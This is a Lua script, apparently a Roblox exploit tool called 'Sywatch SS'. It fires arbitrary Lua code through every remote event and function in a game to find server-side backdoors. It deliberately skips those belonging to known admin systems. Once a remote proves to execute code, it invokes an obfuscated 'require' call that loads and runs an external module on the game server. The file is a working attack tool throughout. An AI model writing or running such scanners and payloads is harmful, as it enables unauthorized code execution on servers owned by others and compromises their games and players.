return function(STATEMENT_TRUE, STATEMENT_FALSE)
	local AutoRun = false

	function notify(text)
		pcall(function()
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Sywatch SS",
				Duration = 5,
				Text = text
			})
		end)
	end

	function debug(Text, LVL)
		local func = print
		if LVL == 1 then func = print end
		if LVL == 2 then func = error end
		if LVL == 3 then func = warn end
		func("Sywatch SS: " .. Text)
	end

	function runRemote(v, data)
		if v:IsA("RemoteEvent") then
			v:FireServer(data)
		elseif v:IsA("RemoteFunction") then
			spawn(function()
				v:InvokeServer(data)
			end)
		end
	end

	function generateName(length)
		local alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
		local text = ""
		for i = 1, length do
			local randIndex = math.random(1, #alphabet)
			text = text .. alphabet:sub(randIndex, randIndex)
		end
		return text
	end

	function findRemote()
		local remotes = {}
		local protected_backdoor = game:GetService("ReplicatedStorage"):FindFirstChild("Sywatch SS" .. ((game.PlaceId / 7777) * 6009 * game.PlaceId))

		if protected_backdoor and protected_backdoor:IsA("RemoteFunction") then
			local code
			repeat
				code = generateName(math.random(12, 30))
			until not remotes[code]

			spawn(function()
				protected_backdoor:InvokeServer("Sywatch SS", "a=Instance.new('Model',workspace)a.Name='" .. code .. "'")
			end)

			remotes[code] = protected_backdoor
		end

		for _, v in ipairs(game:GetDescendants()) do
			if not (v:IsA("RemoteEvent") or v:IsA("RemoteFunction")) then continue end

			if string.split(v:GetFullName(), ".")[1] == "RobloxReplicatedStorage" then
				debug("Roblox Replicated Storage (" .. v.Name .. ")", 1)
				continue
			end

			local parent = v.Parent
			local grandparent = parent and parent.Parent
			local greatgrandparent = grandparent and grandparent.Parent

			if parent == game:GetService("ReplicatedStorage") or grandparent == game:GetService("ReplicatedStorage") or greatgrandparent == game:GetService("ReplicatedStorage") then
				if v:FindFirstChild("__FUNCTION") or v.Name == "__FUNCTION" then
					debug("Adonis filter detected (" .. v.Name .. ")", 1)
					continue
				end

				if grandparent and grandparent.Name == "HDAdminClient" and parent.Name == "Signals" then
					debug("HD Admin (" .. v.Name .. ")", 1)
					continue
				end

				if parent.Name == "DefaultChatSystemChatEvents" then
					debug("Chat event (" .. v.Name .. ")", 1)
					continue
				end
			end

			local code
			repeat
				code = generateName(math.random(12, 30))
			until not remotes[code]

			runRemote(v, "a=Instance.new('Model',workspace)a.Name='" .. code .. "'")
			remotes[code] = v
			debug("Sended Backdoor '" .. v:GetFullName() .. "'", 1)
		end

		for _ = 1, 100 do
			for code, v in pairs(remotes) do
				if game:GetService("Workspace"):FindFirstChild(code) then
					debug(v:GetFullName(), 3)
					runRemote(v, "require(171016405.1884*69)")
					return true
				end
			end
		end

		return false
	end

	if not AutoRun then
		AutoRun = true
		debug("Scanning...", 3)
		notify("Scanning...")

		local found = findRemote()
		if found then
			-- Backdoor FOUND
			if STATEMENT_FALSE then pcall(STATEMENT_FALSE) end
		else
			-- Backdoor NOT found
			if STATEMENT_TRUE then pcall(STATEMENT_TRUE) end
		end

		AutoRun = false
	end
end
